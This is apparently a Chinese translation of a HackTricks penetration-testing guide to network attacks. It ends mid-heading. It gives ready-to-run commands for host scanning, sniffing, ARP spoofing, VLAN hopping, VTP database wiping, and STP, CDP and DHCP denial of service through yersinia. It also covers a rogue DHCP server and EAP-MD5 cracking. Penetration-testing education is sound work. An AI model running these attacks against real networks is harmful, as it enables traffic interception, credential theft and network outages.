# 网络渗透测试

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**赏金猎人提示**：**注册**Intigriti，这是一个由黑客创建的高级**赏金猎人平台**！立即加入我们的[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 从外部发现主机

这将是一个关于如何从**互联网**中找到**响应的IP地址**的**简短部分**。\
在这种情况下，你有一些**IP范围**（甚至可能有几个**范围**），你只需要找出**哪些IP地址正在响应**。

### ICMP

这是发现主机是否启动的**最简单**和**最快**的方法。\
你可以尝试发送一些**ICMP**数据包并**期望响应**。最简单的方法就是发送一个**回显请求**并期望响应。你可以使用简单的`ping`命令或者使用`fping`命令来处理**范围**。\
你也可以使用**nmap**发送其他类型的ICMP数据包（这将避免常见的ICMP回显请求-响应的过滤器）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PEPM -sP -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP端口发现

很常见的情况是发现所有类型的ICMP数据包都被过滤了。那么，你可以做的就是**尝试查找开放的端口**来检查主机是否在线。每个主机有**65535个端口**，所以，如果你有一个"大"的范围，你**不能**测试每个主机的**每个端口**是否开放，那将花费太多时间。\
因此，你需要一个**快速的端口扫描器**（[masscan](https://github.com/robertdavidgraham/masscan)）和一个**常用端口的列表：**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
你也可以使用`nmap`执行这一步骤，但它速度较慢，而且`nmap`在识别主机上存在问题。

### HTTP端口发现

这只是一个TCP端口发现，当你想要**专注于发现HTTP服务**时非常有用：
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP端口发现

您还可以尝试检查一些**UDP端口是否开放**，以决定是否应该对一个**主机**给予更多关注。由于UDP服务通常不会对常规的空UDP探测数据包做出任何响应，因此很难确定端口是被过滤还是开放的。最简单的方法是发送与正在运行的服务相关的数据包，但由于您不知道运行的是哪个服务，您应该根据端口号尝试最有可能的服务：
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
之前提到的nmap命令将测试**/24**范围内每个主机的**前1000个UDP端口**，但即使只有这样，也需要**>20分钟**。如果需要**更快的结果**，可以使用[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)：`./udp-proto-scanner.pl 199.66.11.53/24`。这将向它们的**预期端口**发送这些**UDP探测**（对于/24范围，只需1分钟）：_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP端口发现
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## WiFi渗透测试

在这里，您可以找到一份关于当前已知的WiFi攻击的详细指南：

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## 从内部发现主机

如果您在网络内部，您首先想要做的事情之一就是**发现其他主机**。根据您可以/想要制造的**噪音程度**，可以执行不同的操作：

### 被动

您可以使用以下工具被动地发现连接网络内的主机：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 主动

请注意，[_**从外部发现主机**_](./#discovering-hosts-from-the-outside)（_TCP/HTTP/UDP/SCTP端口发现_）中提到的技术也可以**在这里应用**。\
但是，由于您与其他主机在**同一网络**中，您可以做**更多的事情**：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### 主动 ICMP

请注意，_从外部发现主机_（[_**ICMP**_](./#icmp)）中提到的技术也可以**应用于此处**。\
但是，由于您与其他主机在**同一网络**中，您可以做**更多的事情**：

* 如果您**ping**一个**子网广播地址**，ping应该会到达**每个主机**，它们可能会对**您做出响应**：`ping -b 10.10.5.255`
* 通过ping**网络广播地址**，您甚至可以找到**其他子网中的主机**：`ping -b 255.255.255.255`
* 使用`nmap`的`-PEPM`标志执行主机发现，发送**ICMPv4 echo**、**timestamp**和**子网掩码请求**：`nmap -PEPM -sP –vvv -n 10.12.5.0/24`

### **远程唤醒**

远程唤醒用于通过**网络消息**启动计算机。用于启动计算机的魔术数据包只是一个数据包，其中提供了**MAC目标地址**，然后在同一个数据包中**重复16次**。\
然后，这种类型的数据包通常以**以太网0x0842**或**UDP数据包发送到端口9**的形式发送。\
如果未提供**\[MAC]**，则数据包将发送到**广播以太网**（广播MAC将被重复）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 扫描主机

一旦你发现了所有你想要深入扫描的IP（外部或内部），可以执行不同的操作。

### TCP

* **开放**端口：_SYN --> SYN/ACK --> RST_
* **关闭**端口：_SYN --> RST/ACK_
* **过滤**端口：_SYN --> \[无响应]_
* **过滤**端口：_SYN --> ICMP消息_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

扫描 UDP 端口有两种选项：

* 发送一个 **UDP 数据包** 并检查是否收到 _**ICMP 不可达**_ 的响应，如果端口是 **关闭的**（在某些情况下，ICMP 将被 **过滤**，因此您将不会收到任何关于端口是关闭还是打开的信息）。
* 发送一个 **格式化的数据报文** 来引发一个来自 **服务**（例如 DNS、DHCP、TFTP 和其他服务，如 _nmap-payloads_ 中所列）的响应。如果收到一个 **响应**，则端口是 **打开的**。

**Nmap** 将使用 "-sV" 来 **混合使用** 这两个选项（UDP 扫描非常慢），但请注意，UDP 扫描比 TCP 扫描要慢：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP扫描

SCTP与TCP和UDP并列。该协议旨在通过IP提供**电话**数据的**传输**，它复制了信令系统7（SS7）的许多可靠性特性，并支持一个更大的协议族，称为SIGTRAN。SCTP受到包括IBM AIX、Oracle Solaris、HP-UX、Linux、Cisco IOS和VxWorks在内的操作系统的支持。

nmap提供了两种不同的SCTP扫描方式：_-sY_和_-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS和IPS逃避

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **更多的nmap选项**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### 揭示内部IP地址

配置错误的路由器、防火墙和网络设备有时会使用非公共源地址对网络探测进行响应。您可以使用_tcpdump_来识别在测试期间从私有地址接收到的数据包。在这种情况下，Kali Linux中的_eth2_接口可以从公共互联网访问（如果您在NAT或防火墙后面，这种类型的数据包可能会被过滤）。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## 嗅探

通过查看捕获的帧和数据包，您可以了解IP范围、子网大小、MAC地址和主机名的详细信息。如果网络配置错误或交换机负载过大，攻击者可以通过被动网络嗅探来捕获敏感材料。

如果以太网交换网络配置正确，您只会看到广播帧和发送给您的MAC地址的内容。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
一个人也可以通过SSH会话在实时中使用Wireshark作为GUI来捕获远程机器的数据包。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercap是一款功能强大的网络渗透测试工具，它提供了许多有用的功能和功能，可以帮助渗透测试人员在网络环境中发现和利用漏洞。以下是一些Bettercap的主要功能：

- **ARP欺骗**：Bettercap可以执行ARP欺骗攻击，欺骗目标设备将其网络流量发送到攻击者控制的机器上。这使得渗透测试人员能够监视和分析目标设备的网络流量。

- **SSL中间人攻击**：Bettercap可以执行SSL中间人攻击，欺骗目标设备与服务器之间的SSL连接。这使得渗透测试人员能够拦截和查看目标设备与服务器之间的加密通信。

- **DNS欺骗**：Bettercap可以执行DNS欺骗攻击，欺骗目标设备将其DNS请求发送到攻击者控制的机器上。这使得渗透测试人员能够劫持目标设备的DNS流量，从而可以重定向目标设备到恶意网站或执行其他恶意操作。

- **模块化框架**：Bettercap是一个模块化的框架，允许用户根据需要加载和使用各种插件和模块。这使得渗透测试人员能够根据具体的渗透测试需求来定制和扩展Bettercap的功能。

- **Web界面**：Bettercap提供了一个Web界面，使用户能够通过浏览器轻松地配置和控制工具。这使得渗透测试人员能够更加方便地使用Bettercap，并且可以实时监视和分析目标设备的网络流量。

总之，Bettercap是一款功能强大且灵活的网络渗透测试工具，它提供了多种攻击技术和功能，可以帮助渗透测试人员发现和利用目标网络中的漏洞。
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

显而易见。

### 捕获凭证

您可以使用工具如[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)从pcap文件或实时接口中解析凭证。

## 局域网攻击

### ARP欺骗

ARP欺骗是指发送虚假的ARP响应，以指示某台机器的IP地址与我们的设备的MAC地址相对应。然后，受害者将更改ARP表，并在每次想要与伪造的IP地址通信时与我们的机器联系。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof（ARP欺骗）**

Arpspoof是一种网络欺骗技术，通过伪造ARP（地址解析协议）响应，欺骗目标设备与网关之间的通信。这种攻击技术可以用于中间人攻击，使攻击者能够拦截、篡改或窃取目标设备和网关之间的通信数据。

Arpspoof工具是一个命令行工具，可以在Linux和Unix系统上使用。它允许攻击者将自己伪装成网络中的其他设备，并发送虚假的ARP响应，欺骗目标设备将其网络流量发送到攻击者的机器上。

使用Arpspoof时，攻击者需要在同一局域网中，具有网络访问权限，并且能够截获目标设备和网关之间的通信。通过欺骗目标设备，攻击者可以监视、篡改或窃取目标设备与网关之间的通信数据。

要使用Arpspoof进行ARP欺骗攻击，可以使用以下命令：

```
arpspoof -i <interface> -t <target> <gateway>
```

其中，`<interface>`是攻击者所在的网络接口，`<target>`是目标设备的IP地址，`<gateway>`是网关的IP地址。

请注意，使用Arpspoof进行ARP欺骗攻击是非法的，除非您有合法的授权和目的。本书仅提供技术信息，不鼓励或支持任何非法活动。
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM溢出

通过发送大量具有不同源MAC地址的数据包来溢出交换机的CAM表。当CAM表已满时，交换机将开始像集线器一样行为（广播所有流量）。
```bash
macof -i <interface>
```
在现代交换机中，这个漏洞已经修复。

### 802.1Q VLAN / DTP 攻击

#### 动态中继

**DTP（动态中继协议）**是一种链路层协议，旨在提供自动中继系统。通过DTP，交换机决定哪个端口将工作在中继模式（Trunk），哪个端口将不工作在中继模式。使用**DTP**表示**网络设计不佳**。**中继应该严格限制在需要的地方，并且应该有文档记录。**

**默认情况下，所有交换机端口都在动态自动模式下运行。**这表示交换机端口处于与相邻交换机的中继初始化模式。**渗透测试人员需要物理连接到交换机并发送一个DTP Desirable帧**，触发端口切换到中继模式。攻击者随后可以使用STP帧分析枚举VLAN，并通过创建虚拟接口绕过VLAN分割。

许多交换机默认支持动态中继协议（DTP），然而，攻击者可以滥用它来**模拟交换机并接收所有VLAN的流量**。工具[_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan)可以嗅探接口并**报告交换机是否处于默认模式、中继模式、动态模式、自动模式或接入模式**（只有接入模式才能避免VLAN跳跃）。该工具将指示交换机是否存在漏洞。

如果发现网络存在漏洞，可以使用_**Yersinia**_发起一个使用协议“**DTP**”的“**启用中继**”，从而能够查看所有VLAN的网络数据包。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

要枚举VLAN，还可以使用脚本[DTPHijacking.py](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)生成DTP Desirable帧。**在任何情况下都不要中断脚本。它每三秒注入一个DTP Desirable帧。交换机上动态创建的trunk通道只会持续五分钟。五分钟后，trunk会断开连接。**
```
sudo python3 DTPHijacking.py --interface eth0
```
我想指出的是，**Access/Desirable (0x03)** 表示 DTP 帧是 Desirable 类型，它告诉端口切换到 Trunk 模式。而 **802.1Q/802.1Q (0xa5)** 表示 **802.1Q** 封装类型。

通过分析 STP 帧，**我们了解到 VLAN 30 和 VLAN 60 的存在**。

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### 攻击特定的 VLAN

一旦你知道了 VLAN ID 和 IP 值，你可以**配置一个虚拟接口来攻击特定的 VLAN**。\
如果没有 DHCP，那么使用 _ifconfig_ 来设置静态 IP 地址。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 自动VLAN跳跃

讨论中提到的**动态干线和创建虚拟接口以及发现其他VLAN中的主机**的攻击是由工具自动执行的：[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### 双标记

如果攻击者知道受害主机的**MAC、IP和VLAN ID的值**，他可以尝试使用指定的VLAN和受害者的VLAN对帧进行**双标记**，然后发送一个数据包。由于**受害者无法与攻击者建立连接**，所以**攻击者最好的选择是通过UDP与可以执行一些有趣操作的协议进行通信**（如SNMP）。

攻击者的另一个选择是通过欺骗受攻击者可访问的由攻击者控制的IP来发起**TCP端口扫描**（可能通过互联网）。然后，攻击者可以在自己拥有的第二个主机上嗅探是否接收到来自受害者的一些数据包。

![](<../../.gitbook/assets/image (635) (1).png>)

要执行此攻击，您可以使用scapy：`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### 侧向VLAN分段绕过 <a href="#d679" id="d679"></a>

如果您可以**访问直接连接的交换机**，则可以在网络中**绕过VLAN分段**。只需将端口切换到trunk模式（也称为trunk），使用目标VLAN的ID创建虚拟接口，并配置IP地址。您可以尝试动态请求地址（DHCP），也可以静态配置。这取决于具体情况。

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### 第3层私有VLAN绕过

在客用无线网络和其他环境中，使用私有VLAN（也称为_端口隔离_）设置来**防止对等方互动**（即，客户端**连接到无线接入点但无法相互通信**）。根据网络ACL（或缺乏ACL），可能可以将IP数据包发送到路由器，然后将其转发回相邻的对等方。

此攻击将向客户端的IP发送**特制数据包，但使用路由器的MAC地址**。然后，**路由器将将数据包重定向到客户端**。与_双标记攻击_一样，您可以通过控制受害者可访问的主机来利用此漏洞。

### VTP攻击

**VTP（VLAN Trunking Protocol）**是一种用于集中管理VLAN的协议。为了跟踪当前的VLAN数据库，交换机会检查特殊的修订号。当发生任何表更新时，修订号会增加一。如果交换机检测到具有较高修订号的配置，它将自动更新其VLAN数据库。

#### VTP域中的角色 <a href="#ebfc" id="ebfc"></a>

* **VTP服务器。** VTP服务器角色的交换机可以创建新的VLAN，删除旧的VLAN或更改VLAN本身的信息。**它还为域中的其他成员生成VTP公告。**
* **VTP客户端。** 处于此角色的交换机将从域中的其他交换机接收特定的VTP公告，以更新其自己的VLAN数据库。客户端在创建VLAN方面受到限制，甚至不允许在本地更改VLAN配置。换句话说，**只读访问。**
* **VTP透明。** 在此模式下，交换机不参与VTP过程，并可以完全和本地管理整个VLAN配置。在透明模式下运行时，交换机仅传输来自其他交换机的VTP公告，而不影响其VLAN配置。**此类交换机的修订号始终为零，无法受到攻击。**

#### 广告类型 <a href="#b384" id="b384"></a>

* **摘要广告 —** VTP服务器每**300秒（5分钟）**发送的VTP公告。此公告存储VTP域名、协议版本、时间戳和MD5配置哈希值。
* **子集广告 —** 每当发生VLAN配置更改时发送的VTP广告。
* **广告请求 —** VTP客户端向VTP服务器请求摘要广告消息。通常作为对交换机检测到具有较高配置修订号的摘要广告的响应消息发送。

VTP只能从trunk端口进行攻击，因为VTP公告只在trunk端口上广播和接收。**因此，在攻击DTP后，您的下一个目标可能是VTP。**要攻击VTP域，您可以使用Yersinia运行VTP注入，从而删除整个VLAN数据库，从而使网络瘫痪。

{% hint style="info" %}
VTP协议有多达**三个版本**。本文攻击的是第一个版本，VTPv1。
{% endhint %}
```bash
yersinia -G #For graphic mode
```
要删除整个VLAN数据库，请选择**删除所有VTP VLAN**选项

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STP攻击

**如果您无法在接口上捕获BPDU帧，则很难成功进行STP攻击。**

#### **STP BPDU DoS**

通过发送大量的BPDUs（拓扑变化通知）或Conf（在创建拓扑时发送的BPDUs）来使交换机过载并停止正常工作。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP 攻击**

当发送 TCP 时，交换机的 CAM 表将在 15 秒内被删除。然后，如果您持续发送这种类型的数据包，CAM 表将不断重新启动（或每 15 秒一次），并且在重新启动时，交换机的行为类似于集线器。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP根攻击**

攻击者模拟交换机的行为，成为网络的STP根。然后，更多的数据将通过他传递。当您连接到两个不同的交换机时，这是很有趣的。\
这是通过发送BPDUs CONF数据包，声称**优先级**值小于实际根交换机的优先级来完成的。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**如果攻击者连接到2个交换机，他可以成为新树的根节点，所有这两个交换机之间的流量都将通过他传递**（将执行中间人攻击）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP攻击

CISCO Discovery Protocol是CISCO设备之间进行通信的协议，用于**发现设备是否在线**以及它们具有哪些功能。

#### 信息收集 <a href="#0e0f" id="0e0f"></a>

**默认情况下，CDP会向所有端口发送通告。**但是，如果入侵者连接到同一交换机上的一个端口，他可以使用网络嗅探器（如Wireshark、tcpdump或Yersinia）提取**有关设备本身的有价值信息**，从其型号到Cisco IOS版本。利用这些信息，他将能够枚举相同版本的Cisco IOS并找到漏洞，然后利用它。

#### CDP洪泛攻击 <a href="#0d6a" id="0d6a"></a>

您可以通过耗尽设备内存来模拟真实的CISCO设备，对CISCO交换机进行拒绝服务（DoS）攻击。
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
选择**泛洪CDP表**选项并开始攻击。交换机的CPU将被过载，CDP邻居表也将被过载，**导致“网络瘫痪”。**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDP冒充攻击
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
你也可以使用[**scapy**](https://github.com/secdev/scapy/)。确保使用`scapy/contrib`软件包进行安装。

### VoIP攻击

尽管旨在供员工使用的互联网电话（VoIP）电话，但现代VoIP设备越来越多地与物联网设备集成。许多员工现在可以使用特殊电话号码解锁门禁，控制房间的恒温器...

工具[**voiphopper**](http://voiphopper.sourceforge.net)模拟了Cisco、Avaya、Nortel和Alcatel-Lucent环境中VoIP电话的行为。它使用其支持的设备发现协议之一（如Cisco Discovery Protocol（CDP）、动态主机配置协议（DHCP）、链路层发现协议媒体端点发现（LLDP-MED）和802.1Q ARP）自动发现语音网络的正确VLAN ID。

**VoIP Hopper**支持**三种**CDP模式。**sniff**模式检查网络数据包并尝试定位VLAN ID。要使用它，请将**`-c`**参数设置为`0`。**spoof**模式生成类似于真实VoIP设备在企业网络中传输的自定义数据包。要使用它，请将**`-c`**参数设置为**`1`**。带有**pre-madepacket**的欺骗模式发送与Cisco 7971G-GE IP电话相同的数据包。要使用它，请将**`-c`**参数设置为**`2`**。

我们使用最后一种方法，因为它是最快的方法。**`-i`**参数指定攻击者的**网络接口**，**`-E`**参数指定正在模拟的**VOIP设备的名称**。我们选择了与Cisco VoIP电话的命名格式兼容的名称SEP001EEEEEEEEE。该格式由“SEP”一词后跟MAC地址组成。在企业环境中，您可以通过查看电话背面的MAC标签；通过按下设置按钮并在电话的显示屏上选择模型信息选项；或通过将VoIP设备的以太网电缆连接到您的笔记本电脑并使用Wireshark观察设备的CDP请求来模拟现有的VoIP设备。
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
如果工具成功执行，**VLAN网络将为攻击者的设备分配一个IPv4地址**。

### DHCP攻击

#### 枚举
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

对DHCP服务器可以执行两种类型的DoS攻击。第一种类型是模拟足够多的虚假主机以使用所有可能的IP地址。\
只有在您能够看到DHCP服务器的响应并完成协议（Discover（计算机）-> Offer（服务器）-> Request（计算机）-> ACK（服务器））时，此攻击才能生效。例如，在Wifi网络中是不可能的。

执行DHCP DoS的另一种方法是使用每个可能的IP地址作为源代码发送DHCP-RELEASE数据包。然后，服务器将认为每个人都已经完成了对IP的使用。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
一种更自动化的方法是使用工具[DHCPing](https://github.com/kamorin/DHCPig)

您可以使用上述的DoS攻击来迫使客户端在环境中获取新的租约，并耗尽合法服务器使其无法响应。因此，当合法服务器尝试重新连接时，**您可以提供下一个攻击中提到的恶意值**。

#### 设置恶意值

您可以使用Responder DHCP脚本（_/usr/share/responder/DHCP.py_）来建立一个恶意的DHCP服务器。设置恶意网关并不理想，因为劫持的连接只是半双工的（即，我们只捕获客户端的出站数据包，而无法捕获合法网关的响应）。因此，我建议设置一个恶意的DNS或WPAD服务器来捕获HTTP流量和凭据。

| 描述                                 | 示例                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| 我们作为网关广告的IP地址     | _-i 10.0.0.100_                                                              |
| 本地DNS域名（可选）        | _-d example.org_                                                             |
| 原始路由器/网关的IP地址   | _-r 10.0.0.1_                                                                |
| 主DNS服务器IP地址               | _-p 10.0.0.100_                                                              |
| 备用DNS服务器IP地址（可选）  | _-s 10.0.0.1_                                                                |
| 本地网络的子网掩码            | _-n 255.255.255.0_                                                           |
| 用于监听DHCP流量的接口 | _-I eth1_                                                                    |
| WPAD配置地址（URL）            | _-w “_[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| 伪造默认网关IP地址        | -S                                                                           |
| 响应所有DHCP请求（非常嘈杂）   | -R                                                                           |

### **EAP攻击**

以下是针对802.1X实现可用的一些攻击策略：

* 通过EAP进行主动暴力密码破解
* 使用恶意的EAP内容攻击RADIUS服务器 _\*\*_(利用漏洞)
* 捕获EAP消息并离线破解密码（EAP-MD5和PEAP）
* 强制使用EAP-MD5身份验证绕过TLS证书验证
* 在使用集线器或类似设备进行身份验证后注入恶意网络流量

如果攻击者位于受害者和认证服务器之间，他可以尝试将认证协议降级（如果需要）为EAP-MD5并捕获认证尝试。然后，他可以使用以下方法进行暴力破解：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP（GLBP和HSRP）攻击 <a href="#6196" id="6196"></a>

